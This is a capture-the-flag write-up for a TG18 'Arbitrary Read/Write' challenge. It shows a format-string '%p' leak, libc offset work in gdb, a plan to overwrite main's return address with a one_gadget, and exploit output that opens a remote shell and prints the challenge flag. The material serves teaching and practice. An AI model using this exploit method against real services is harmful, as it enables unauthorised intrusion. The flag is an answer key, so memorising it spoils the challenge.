# Arbitrary Read/Write writeup

NOTE: This writeup was written while we didn't intend to give out the binary.

When connecting, we can enter our name, and then we are presented with the
following menu options:
```
1. read
2. write
3. quit
```

Not much to choose from. When trying to read from normal start addresses for
Linux binaries, the program crashes, so we can assume that it's a
[PIE](https://en.wikipedia.org/wiki/Position-independent_code). Which in turn
means that we have to leak some memory to continue. The only viable option seems
to be the name entry. Let's try.

```
What's your name? %p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Welcome 0x7fcd5380c780.0x7fcd5353d290.0x7fcd53a22700.0x8.(nil).(nil).(nil)
.(nil).(nil).(nil)
```

Score! There are only three addresses that stand out, however. And they all seem
to be from libc. We can also confirm that the binary is 64-bit. These addresses
are inside libc, so we can compile our own binary and see what these values
point to.

```
#include <stdio.h>

int main(void)
{
	printf("%p.%p.%p\n");
	return 0;
}
```

When running, we get these values back;
```
0x7fffffffe3a8.0x7fffffffe3b8.(nil)
```

These don't look like the ones from the remote service, however. We can try to
recreate the remote binary from the actions we know that it performs:

```C
#include <stdio.h>
#include <unistd.h>

int main(void)
{
	char name[64] = { 0 };
	alarm(30);
	setvbuf(stdout, NULL, _IONBF, 0);

	printf("What's your name? ");
	fgets(name, sizeof(name), stdin);
	printf("Welcome ");
	printf(name);

	return 0;
}
```

We break right after the call to printf and look at the values:
```
Welcome 0x7fffffffbbe0.0x7ffff7dd3780.0x7ffff7b04290
```
The third one matches the second address leaked from the remote binary!

```
gdb-peda$ x/i 0x7ffff7b04290
   0x7ffff7b04290 <__write_nocancel+7>:	cmp    rax,0xfffffffffffff001
```

This means that we are leaking `__write_nocancel+7`.

The offset from the libc base is `0xf7290`. From here we have a couple of
options. We can either try to manipulate libc in some way, for example by
overwriting `__malloc_hook` with a one-shot gadget. However, we don't know much
about the binary, and judging by its limited functionality, chances are that
it's not calling `malloc()`.

The other option is to find the end of the stack by reading from
`__libc_stack_end`, and working our way backwards to find the return address
from `main()`, which is `__libc_start_main+240`.

We can use [one_gadget](https://github.com/david942j/one_gadget) to find
one-shot gadgets to spawn a remote shell.

The solution source code can be found [here](src/solve.py).

```
[+] Opening connection to arbitrary.tghack.no on port 1060: Done
[*] libc base: 0x7fcec166f000
[*] stack end: 0x7fff3dfada10
[*] found return from main: 0x7fcec168f830
[+] shell 4 u <3
[*] Switching to interactive mode
 $ ls
flag.txt
main
$ cat flag.txt
TG18{n3xt_t1m3_w3_sh0uld_protect_th3_st4ck_as_w3ll}
```
